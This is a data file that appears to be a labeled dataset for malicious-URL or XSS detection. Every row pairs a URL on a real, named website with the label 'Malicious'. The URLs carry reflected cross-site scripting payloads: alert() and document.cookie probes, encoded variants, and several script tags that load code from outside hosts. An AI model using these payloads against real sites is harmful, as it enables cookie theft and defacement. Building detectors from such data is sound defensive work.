http://search.insidenova.com/search.jsp?srcht=s&amp;mmethod=submitquery&amp;mstart=1&amp;firstload=false&amp;msortne<br>wsby=date&amp;msortphotoby=relevance&amp;msorteventsby=reversedate&amp;mode=&amp;msortshoppingby=relevance&amp;msortby=+<br>&amp;sname=isn&amp;skeywordcategory=&amp;thisssurl=&amp;moreresults=&amp;spellstate=&amp;moresourceflag=&amp;minfosourceflag=all<br>&amp;mquery=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+<br>xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;submitbutton.x=30&amp;submitbutton.y=7&amp;submitbutton=search,Malicious
http://www.iibf.org.in/scripts/searchresults.asp?sitequery=%22%2f%3e%3cscript%3ealert%28%22xss%3a+vijayendra%22%29%3c%2fscript%3e&x=22&y=7,Malicious
http://www.sport.ro/?module=website&amp;page=arhiva&amp;year=2008&amp;month=3&amp;day=&lt;script&gt;document.write(&lt;h1&gt;dr.<br>optix&lt;/h1&gt;);alert('xssed%20by%20dr.optix');alert('what?%20when?%20where?');alert('another%20section%<br>20of%20sport.ro')&lt;/script&gt;,Malicious
http://muneccim.net/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.minami.co.jp/ss/shop.cgi?mode=40'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso.co<br>m%22)%3c/script%3e,Malicious
http://blackberry.o2.co.uk/accessories.asp?filterby=8707g%3cscript%3ealert(%22agd_scorp%22)%3c/scrip<br>t%3e,Malicious
http://www.yasni.de/ext.php?url=%3cscript%3ealert%28document.cookie%29%3c/script%3e%3ciframe%20src=%<br>22http://xssed.com%22%3e,Malicious
http://search.newyorkfed.org/search/search.jsp?who='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3<br>e%3cmarquee%3ewhitehat%20forever%3c/marque%3e&amp;template='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3c<br>br%3e%3cmarquee%3ewhitehat%20forever%3c/marque%3e,Malicious
http://www.immobilier-paris-verneuil.com/index.php?lang=fr/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,Malicious
http://www.udg.mx/directoriowebs/contalink.php/%3e%22%3e%3cscript%3ealert('norehem')%3c/script%3e.,Malicious
http://activepaper.olivesoftware.com/default/welcome.asp?skin=registerd&amp;qs=&quot;&gt;&lt;script&gt;alert(1);&lt;/scri<br>pt&gt;,Malicious
"http://www.ciao.co.uk/sr/q-%22/%3e%3c/a%3e%3c/%3e%3cimg+src%3d1.gif+onerror%3dalert%281337%29%3e,tc-<br>5297241",Malicious
http://www.niss.gov.ua/cgi-bin/awstats.pl?output=urldetail&amp;config=redhat9.niss.gov.ua&amp;lang=en&amp;urlfil<br>ter=&lt;script&gt;alert('arham muhammad')&lt;/script&gt;,Malicious
http://home.tudelft.nl/index.php?id=781&amp;q=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;searchradio=on&amp;option=start&amp;min=10&amp;start=0,Malicious
http://kitty.9bis.com/%27%22%3e%3cscript%3ealert(1337)%3c/script%3e%3cmarquee%3e%3ch1%3exss%20by%20x<br>ylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://videolog.uol.com.br/busca2.php?parametro=%27%22%3e%3cscript%3ealert%281111%29%3c%2fscript%3e&amp;<br>f=0&amp;x=0&amp;y=0,Malicious
http://dms.standards.utah.gov/phpinfo.php?a[]=%3cscript%3ealert(123)%3c/script%3e,Malicious
http://benq.lt/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+nar<br>coticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://equineclassifieds.net/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://ferio-fuu.tk/a?t=%27%22%3e%3c%2f%74%69%74%6c%65%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%<br>31%33%33%37%29%3c%2f%73%63%72%69%70%74%3e%3e%3c%6d%61%72%71%75%65%65%3e%3c%68%31%3e%58%53%53%20%62%7<br>9%20%58%59%4c%49%54%4f%4c%3c%2f%68%31%3e%3c%2f%6d%61%72%71%75%65%65%3eferio-fuu.tk+fanlisting+feriox<br>fuu+isshin+ferio&amp;c=1&amp;p=1&amp;r=1196638923170,Malicious
http://www.x-eworld.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoo<br>r&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.ideacellular.com/idea.portal?_nfpb=true&amp;portlet_13_1_actionoverride=&lt;script&gt;alert('sandee<br>p l337')&lt;/script&gt;&amp;_windowlabel=portlet_13_1&amp;_pagelabel=idea_page_forgotpassword,Malicious
http://marketwatch.nytimes.com/custom/nyt-com/html-story.asp?guid=%7bc63c20d8-a8f1-439b-8d74-3e05f89<br>00d87%7d&amp;symb=%22%3e%3cscript%3ealert('i-landet')%3c/script%3e%3cnada%20a=%22,Malicious
http://forums.cnet.com/5238-7813-0.html?kw=%3cscript%3ealert%28123%29%3c%2fscript%3e&amp;select=all+cnet<br>+forums&amp;forumid=&amp;threadid=&amp;messagetype=1&amp;tag=srchbr,Malicious
http://www.michelin.ro/ro/front/search.jsp?query=cautare%2e%2e%2e&amp;lang=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert('xs<br>s%20by%20turkpower%20-%20canim%20turkiyem')%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.quill.se/swe/catalog/cat_results.asp?ct=1&amp;txtsearch=%22%3e%3cscript%3ealert(%22maxwel%22)<br>%3c/script%3e,Malicious
http://www.betechseals.dk/irj/portal/anonymous?guest_user=&gt;&lt;script&gt;alert(&quot;818&quot;)&lt;/script&gt;&gt;&lt;script&gt;ale<br>rt(&quot;818&quot;)&lt;/script&gt;,Malicious
http://www.ibm.com/developerworks/views/global/tutorials.jsp?sort_by=title&amp;show_abstract=true&amp;zone_b<br>y=all+zones&amp;topic_by=all+topics&amp;search_by=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;submit.x=0&amp;subm<br>it.y=0,Malicious
http://support.devil7.com/index.php?&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr.com/chat/c<br>.js&quot;%20type=&quot;text/javascript&quot;&gt;kabus-kabustr.com-kabus-kabustr.com&lt;/script&gt;&lt;script&gt;alert(document.coo<br>kie);&lt;/script&gt;&lt;script&gt;alert(/kabus/);&lt;/script&gt;,Malicious
http://www.cvijet.hr/galerija/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.adidas.com/scripts/cud/registration/signup_her.asp?strbrand=%22%3e%3cscript%3ealert('guru<br>%20of%20hacking-gurus.com')%3c/script%3e,Malicious
http://search.smartone-vodafone.com/search/search_result.jsp?hitsperpage=%22%3cscript%3ealert%28%22x<br>ssed%22%29%3c/script%3e&amp;lang=tchinese&amp;query=,Malicious
http://www.web34hosting.com/menude/resimler/login.asp?n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://nbcsports.resultspage.com/search?p=q&amp;ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(document.cook<br>ie);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0,Malicious
http://www.ulakbim.gov.tr/cabim/vt/index.php?filter%5bkeyword%5d=&amp;filter%5baccessibility%5d=2&amp;filter<br>%5btype%5d=1&amp;submit=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://liste.org/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
"https://wlan.net.vodafone.it/vfile/pwlan/pages/otp/login_partner.jsp?loginurl=login.linkem.com/sd/lo<br>gin&amp;accesslocation=isocc=it,cc=39,ac=06,network=linkem&amp;logoffurl=x&amp;locationname=&quot;&gt;&lt;script&gt;alert('xss<br>')&lt;/script&gt;",Malicious
http://www.gelgir.org/search.php?q=%22%3ehttp://www.dosya.in/search.php?q=%22%3e%3clink%20href=http:<br>//starext.by.ru/css.css%20type=text/css%20rel=stylesheet%3e,Malicious
http://www.independent.co.uk/search/index.jsp?eceexpr=sadsadsa&amp;ecemode=search&amp;eceform=simple&amp;ecefiel<br>d=all&amp;ecetodate=true&amp;ecefromdate=true&amp;ecefromday=1&amp;ecetoday=7&amp;ecefrommonth=0&amp;ecetomonth=3&amp;ecefromyea<br>r=1999&amp;ecetoyear=2008&amp;todaytoday=7&amp;todaytomonth=3&amp;todaytoyear=2008&amp;todayfromday=6&amp;todayfrommonth=3&amp;t<br>odayfromyear=2008&amp;last7daysfromday=30&amp;last7daysfrommonth=2&amp;last7daysfromyear=2008&amp;last30daysfromday=<br>7&amp;last30daysfrommonth=2&amp;last30daysfromyear=2008&amp;allfromday=1&amp;allfrommonth=0&amp;allfromyear=1999&amp;refinee<br>xpr=sadsadsa&amp;ecesection=1293&amp;daterange=all&amp;ecesort=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://www.xloop-uk.co.uk/shopcustadmin.asp?msg=%3e'%3e%3cscript%20%0a%0d%3ealert(cyber-unity)%3b%3c<br>/script%3e%20%3cscript+src=%22http://cyber-unity.com/x55.js?,Malicious
http://www.inbumtv.com/inbumtv_new/bbs/search.php?srows=%22%3e%3cscript%3ealert%28document.cookie%29<br>%3c/script%3e&amp;gr_id=&amp;sfl=wr_subject||wr_content&amp;stx=&amp;sop=or#g4_head,Malicious
http://codestriker.sourceforge.net/cgi-bin/codestriker.pl?topic=6820609&amp;action=view&amp;mode=%22%3e%3csc<br>ript%3ealert%28document.cookie%29%3c/script%3e&amp;fview=-%22%3e%3cscript%3ealert%28document.cookie%29%3<br>c/script%3e,Malicious
http://shop.ozracing.com/moda/ozracing_product_chooser.php?product_name=%22%3e'%3e%3cscript%3ealert(<br>123)%3c/script%3e%22',Malicious
"http://www.vodafone.com/mc_search_results/0,3227,category_id%253d200%2526fnc%253d3%2526language_id%2<br>53d0%2526content_id%253d-205,00.html?kwd=live%2bdevices&amp;main_cat=-1&amp;sub_cat=-1&amp;sub_sub_cat=&quot;&gt;&lt;script<br>&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;",Malicious
http://webserver.tms.gov.tw/images/info.php?a[]=%3cscript%3ealert(/xssed_by_omeha/);%3c/script%3e%3c<br>script%3ealert(document.cookie);%3c/script%3e,Malicious
http://cgi.mbs.co.jp/cgi-bin/fixf/view.cgi?&amp;id=yando&amp;line=50'%3e%22%3e%3cscript/src=http://kusomiso.<br>com/xss.js%3e%3c/script%3e,Malicious
http://www.gcee.org/messageboard/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/<br>script&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
http://www.ulg.ac.be/cms/j_15081/portail-infos?text=%3c/script%3e%3ciframe%20src=%22http://xssed.com<br>%22%3e&amp;types=generated.actualite&amp;types=generated.actualitewebtv&amp;types=generated.agenda&amp;types=generat<br>ed.agendaanneedeslangues&amp;types=generated.agendafacultaire&amp;types=generated.communiquedepresse&amp;types=g<br>enerated.evenementprotocolaire&amp;types=generated.galeriephotos&amp;types=generated.page&amp;textsearch=true&amp;se<br>archinfiles=true&amp;mode=any&amp;portlet=j_5895&amp;portlet=j_5895,Malicious
http://www.scb.se/templates/standard____150563.asp?ie=iso-8859-1&amp;hl=en&amp;q=&quot;&gt;&lt;script&gt;alert(&quot;fugitif&quot;)&lt;<br>/script&gt;,Malicious
http://gallery.azlink.info/gallery/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.jdpools.com/news_event/newsdetail.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281%29%3c<br>/script%3e,Malicious
http://mkt.fem.jp/color.cgi?bg=&amp;bg=%22%3e%27%3e%3cscript%3ealert%28%22kusomiso.com%22%29%3c%2fscript<br>%3e&amp;text=&amp;text=&amp;link=&amp;link=&amp;alink=&amp;alink=&amp;vlink=&amp;vlink=,Malicious
http://store.britannica.com/shopping/search/advancedsearchmain.jsp?scopt=and&amp;asdb=n&amp;ssort=d&amp;sview=th<br>umb&amp;asp=1&amp;skey=%22%3e%27%3e%3cscript%3ealert%28123%29%3c%2fscript%3e%22%27&amp;scat=394&amp;sbrand=fun+%26+g<br>ames&amp;sage=all&amp;sprice=0&amp;go.x=12&amp;go.y=10&amp;go=search,Malicious
http://research.it.uts.edu.au/re/re-archive/%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3<br>e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://journalfinder.uncg.edu/uncg/search-title.asp?ucrit=&lt;script&gt;alert(&quot;scriptorium(turkey)hackhabe<br>r.com&quot;)&lt;/script&gt;,Malicious
http://www.anzen.mofa.go.jp/kaian_search/search_pub.asp?period=1%22%3e%27%3e%3c%73%63%72%69%70%74%3e<br>%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%<br>33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%3<br>1%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.pri.senado.gob.mx/index.php?actual_sm=2&amp;ido=8&amp;cadena=%3cscript%3ealert('xss');%3c/script%<br>3e,Malicious
http://www.howpweb.cn/?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%<br>6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%3<br>2%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c<br>%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://www.jump.co.za/search/%3ciframe+src%3djavascript%3aalert(123)%3e,Malicious
http://www.tr-ance.com/forumkeywords.php?tag=%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://boincstats.com/stats/project_graph.php?pr='%3e%22%3e%3ciframe%20src=http://kusomiso.com/xss.h<br>tml%20%3c,Malicious
http://www.recalls.gov.au/search_recall_namesearch.php?product_name=%22%3e'%3e%3cscript%3ealert(123)<br>%3c/script%3e%22'&amp;submit2=submit,Malicious
http://www.azzifamily.com/familytree/individual.php?pid=i115&amp;ged=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;,Malicious
http://vikjavev.no/hovudsida/soek.php?soek=&quot;&gt;&lt;center&gt;&lt;img%20src=&quot;http://img251.imageshack.us/img251/<br>9587/turk1mf6.gif&quot;&gt;,Malicious
http://mastervolt.com/index2.php/index2.php?lang=2&amp;cat_id=16&amp;tekst_id=63&quot;&gt;&lt;script&gt;alert(document.coo<br>kie)&lt;/script&gt;,Malicious
https://register.go.com/go/sendpassword?aff_code=go&amp;appredirect=%22/%3e%3ciframe%20src=http://google<br>.com%3e%3c/iframe%3e%3cscript%20src=http://ha.ckers.org/xss.js?/%3e,Malicious
http://www.tuik.gov.tr/pretablo.do?tb_id=19&amp;tb_adi=fiyat%20&amp;#304;statistikleri&amp;ust_id='&gt;&lt;/script&gt;&lt;sc<br>ript&gt;alert(document.cookie)&lt;/script&gt;''&gt;&lt;h1&gt;djsedat%20narcoticxs&lt;/h1&gt;,Malicious
http://walmartstores.com/globalwmstoresweb/search.do?subcatid=316&amp;simplesearchfor=%3cscript%3ealert(<br>%22xss%22)%3c%2fscript%3e&amp;x=0&amp;y=0,Malicious
http://www.toyotasa.com.tr/site_tools/searchresults.aspx?catalogname=mkg_toy_v8_trtr&amp;type=wordlist&amp;q<br>uery=&quot;&gt;&lt;script&gt;alert(&quot;bluemax&quot;)&lt;/script&gt;,Malicious
http://help.travian.si/index.php?type=faq&amp;mod=%22%3e%3cscript%3ealert%28%2fxss+by+redtuning%2f%29%3b<br>%3c%2fscript%3e,Malicious
http://www.powerpublishinginc.com/index.php?fa=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://myboard.jp/i/register.php?mode=make&amp;id=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.co<br>m%2fxss.js%3e%3c%2fscript%3e&amp;title=&amp;handle=&amp;pass=&amp;mail=&amp;bbstype=1&amp;design=1,Malicious
http://www.cynthiasays.com/fulloptions.asp?browse_emul=cynthia+1.0&amp;rptmode=%2d1&amp;url1=%22%3e%3cscript<br>%3ealert%28%27cynthia+says%3a+i+have+xss+issues%21%27%29%3b%3c/script%3e&amp;emsg=%0d%0a%3cbr%3ethe+url%<br>3a+%22%3e%3cscript%3ealert%28%27cynthia+says%3a+i+have+xss+issues%21%27%29%3b%3c/script%3e+has+an+un<br>supported+url+scheme.++url+entries+must+start+with+either+%27http%3a//%27+or+%27https%3a//%27.&lt;scrip<br>t&gt;alert('even%20the%20error%20message%20itself%20is%20vulnerable!');&lt;/script&gt;,Malicious
http://www.emmawatsonofficial.com/popup/gallery?ss=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/s<br>cript%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.anfr.fr/index.php?cat=3e%22%3e%3cscript%20%0a%0d%3ealert(document.cookie)%3b%3c/script%3e,Malicious
"http://ee.trendmicro-europe.com/enterprise/vinfo/encyclopedia.php?vname=//--%3e%3c/script%3e%22%3e'%<br>3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://www.seriilan.com/index.php?goster=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.cookie)%3b%3c/<br>script%3e,Malicious
http://eas.apm.emediate.eu/media.5/common/image.html?image=%22%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://ad-click.jp/members/cushion.php?ssid='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c<br>/script%3e,Malicious
http://www.fun456.com/?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%<br>6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%2<br>9%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
"https://www.pinkbike.com/buysell/list/?q=%3c%3cscript%3ealert%28%22xss%20discoverd%20by%20pin0yexpl0<br>itteam%20==%3e%3e%3e%3e%20greets%20to%20phantom29m,%20frenzycondomx,%20nephron,%20djkilla%3c%3c===++<br>%20longlive%20to%20all%20filipino%20hackers!++_redhat9112_%22%29;//%3c%3c/script%3e&amp;category=0&amp;pmin=<br>&amp;pmax=&amp;region=",Malicious
http://www.pislick.net/v2/?pislick=arama&amp;o=aradim&amp;aranan=%3ctitle%3efucked+%3c/title%3e%3cscript%3ea<br>lert(%22a.q+emmi+siz+t%fcrk+vatanda%felar%fdm%fdza+hizmet+ediyorsunuz+pislick+ne+demek+t%fcrk%e7emiz<br>in+i%e7ine+etiniz+dillerde+k%fdro+%feeklinde+bir+marka+b%fdrakt%fdn%fdz+pislickmi%fe+a.q+avrupa+%f6z<br>entileri+www.google.com%22)%3c/script%3e%3ch1%3e%3cfont%20color=darkred%3ea.q+emmi+siz+t%fcrk+vatand<br>a%felar%fdm%fdza+hizmet+ediyorsunuz+pislick+ne+demek+t%fcrk%e7emizin+i%e7ine+etiniz+dillerde+k%fdro+<br>%feeklinde+bir+marka+b%fdrakt%fdn%fdz+pislickmi%fe+a.q+avrupa+%f6zentileri+%3cbr%3ewww.google.com%20<br>bekleriz%3c/h1%3e,Malicious
http://www.aegonbank.nl/?site=www.aegonbank.nl&amp;mediasurface_target=/?view=search+results&amp;view=search<br>+results&amp;freesearch=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.maktoob.com/searchresult.php?q='%22%3e%3e%3cmarquee%3e%3ch1%3e%3cstrong%3e%3ci%3ecueballr<br>%3c/i%3e%3c/strong%3e%3c/h1%3e%3c/marquee%3e,Malicious
http://marketing.networksolutions.com/dms/09q2/me/index.php?channelid=%22%3e%3cscript%3ealert(%27xss<br>%27)%3c/script%3e [many alert() calls!],Malicious
http://www.belstat.com/viewtab_se.asp?userid=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.wqmzj.gov.cn/download.asp?bigclassname=%3cscript%3ealert(%22xss%22)%3c/script%3e&amp;smallcla<br>ssname=%b3%c7%ca%d0%b5%cd%b1%a3,Malicious
http://www.siirinrengi.com/members.asp?mode=search&amp;m_name=g&amp;initial=1&amp;method=&quot;&gt;&lt;script&gt;alert(&quot;xssedb<br>ycicosz&quot;)&lt;/script&gt;,Malicious
http://mcafee.com/japan/mcafee/support/faq/answer_f_install.asp?wk=%22%3e%3cscript%3ealert(420)%3c/s<br>cript%3e,Malicious
http://www.csmonitor.com/search?sort=date:d:s:d1&amp;output=xml_no_dtd&amp;oe=utf-8&amp;ie=utf-8&amp;client=default_<br>frontend&amp;proxystylesheet=monitor_style&amp;site=csmonitor&amp;q=&quot; scrolling=&quot;no&quot; width=&quot;728&quot; height=&quot;90&quot;<br>frameborder=&quot;0&quot; vscape=&quot;0&quot; hspace=&quot;0&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;br&gt;&lt;iframe<br>src=&quot;http://google.com,Malicious
http://www.ipa-osnabrueck.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>ackdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://search.commscope.com/icss5/systimax/fre/search.jsp?icss%3asearch%3aquery%3afield=all&amp;icss%3as<br>earch%3actexid=&amp;icss%3asearch%3asecid=&amp;schoption=company&amp;icss%3asearch%3aquery=%27%22%3e%3c%2ftitle%<br>3e%3cscript%3ealert(1337)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarqu<br>ee%3e,Malicious
http://www.hostingnova.net/nova/cart.php?ca=add_other&amp;oid=1%22%3e%3cscript%3ealert(document.cookie)%<br>3c/script%3e,Malicious
http://www.cardiffconferencebureau.co.uk//site_search.asp?search=%3e%22%3e%3cscript%3ealert%28%27xss<br>%20-%20vuln%27%29%3c%2fscript%3e,Malicious
http://finance.aol.com/ukw/quotes/charts?dr=999&amp;symbs=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e&amp;<br>x=0&amp;y=0&amp;ag=&amp;index=&amp;te=line&amp;se=default&amp;vl=on&amp;hs=on&amp;vs=on&amp;sym=&amp;exch=gbr&amp;state=1&amp;settings=1&amp;vl1=on&amp;ss1=<br>on&amp;dv1=off&amp;hs1=on&amp;vs1=on&amp;scs=0&amp;daysb4=0&amp;fromdate=&amp;todate=&amp;freq=1&amp;timeframe=0,Malicious
http://kino.uz/search/?key=%22%3etesticles%3c/a%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://vesta.cumc.columbia.edu/dermatology/index.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%28133<br>7%29%3c/script%3e,Malicious
http://verno.ueda.info.waseda.ac.jp/urlcheck.cgi?url=http%3a%2f%2fkusomiso.com%2f%27%3e%22%3e%3cscri<br>pt%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fx.js%3e%3c%2fscript%3e,Malicious
http://www.agentopolis.com/real-estate-agent-directory.asp?acstate=%22%3e%3cscript%3ealert(%27xssed%<br>20again%27)%3c/script%3e&amp;accity=%3e%3cscript%3ealert(%27xssed%27)%3c/script%3e&amp;findaccnt=agent+searc<br>h,Malicious
http://www.tom.sfc.keio.ac.jp/~sakai/d/?year=2006'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%<br>3e%3c/script%3e;month=1h;category=l,Malicious
http://www.ptcl.com.pk/searchall.php?key=%22%3e%3cscript%3ealert%28%27pakistan+telecommunication+lim<br>ited+pwned+by+neo+gurus%27%29%3c%2fscript%3e%3cimg+src%3d%22http%3a%2f%2fimg149.imageshack.us%2fimg1<br>49%2f1232%2flogonj5.gif%22%3e%3c,Malicious
http://www.treasuryfinland.fi/public/unrestricted/customerror.aspx?errormsg=&lt;script&gt;alert('xss')&lt;/sc<br>ript&gt;,Malicious
http://www.feriaok.com.ec/avisos/buscar.asp?px=70&amp;txtbuscar=%22%3e%3cscript%3ealert%28%22\\.+ur0b0r0<br>x+.%2f%22%29%3b%3c%2fscript%3e&amp;mcategoria_1=0&amp;x=8&amp;y=15,Malicious
http://www.canalsolidario.org/web/buscador/?searchtext=%3e%3cscript%3ealert('xss')%3c/script%3e%3e%3<br>cmarquee%3e%3ch1%3eby+ivan_sanchez%3c/h1%3e%3c/marquee%3e,Malicious
http://highmail.aryanic.com/default.asp?e=i&amp;errcode=%3cscript%3ealert%28%27securitylab.ir%27%29%3c/s<br>cript%3e,Malicious
http://www.justiz.gv.at/en/?glng=en%27%22%3e%3cimg%20src=foo.png%20onerror=alert(/xss/)%20/%3e%3cmar<br>quee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://mizi.ivyro.net/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%70%<br>74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%3<br>1%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31<br>%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://www.fcpr.ro/clasamente.php?tip=1&amp;idj=11&amp;idconc=%22%3e%3cscript%3ealert(document.cookie)%3c/sc<br>ript%3e,Malicious
"http://globalmuonline.gamersfirst.com/wallpaper_large.php?file=%22%3e%3cscript%3ealert(string.fromch<br>arcode(88,83,83))%3c/script%3e",Malicious
http://www.superherohype.com/search.php?keywords=%22%3e%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/s<br>cript%3e,Malicious
http://www.lovehorse.co.uk/member/profile_list.php?command=search_result&amp;search_type=&quot;&gt;&lt;script&gt;alert<br>(&quot;backdoor&quot;)&lt;/script&gt;,Malicious
http://www.ncnet-webjobs.info/search_result.php?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://tore.vamraak.no/bibelen.asp?ver=1&amp;bok=1mo&amp;kap=%22%3e%3cbody+onload=alert(%22by%20encore%22)%3<br>e%3cmarquee%3e%3ch1%3eunutamadim%20:(%20%20%20%3c/h1%3e%3ch2%3e%20by%20encore%20%3c/h2%3e,Malicious
http://bank.org/result.php?keywords=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fx.js%3<br>e%3c%2fscript%3e&amp;r=c%253ezngvbz6wdnd%253e%2527tfbsdi%2560uzqf%253etfbsdi%2527f%253ekq%253ckq%253c33%<br>253c2%253c2%253c77124%253a%253ctuzmf2%256033%252fdtt%253c3%253cjoufsdptnpt%2560bggjmjbuf%25602%2560e<br>3s%2560efsq%253cnfflebo%253cnfflebo%253c759%253c759%253cdmfbo%253c%253c0e0tfbsdi0q0joufsdptnpt0ynm0e<br>pnbjomboefs0joum0e3s0gfg0qpqdbu0w30%253cenynm%252fjoufsdptnpt%252fpwfsuvsf%252fdpn%2527enybsht%253e1<br>7pfozb5%255bhkcmvymzows.y%253abqsvqr%253awu%255bvr%2560ibeswcltchngp3%257bds%255bqzw1wqcglq9qdri2snu<br>ide2ufwe9yr5bczuqs%257bfwt8xcfkrc26zool3tmphiuruxf%253agguxt3is2pbi7jf%253af2j.%2560%257bldhjtqd7f%2<br>55bf3o.vkkfwydenuylq%257bs3zvuhr%257bfbd1n84dv9kel5gtcstq2zoms7zlrb%252f%252f-zu1%257b&amp;submit=go,Malicious
http://www.fczoom.fr/index.php?rech-site=&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;submit.x=14&amp;submit.y=9&amp;act=rechercher,Malicious
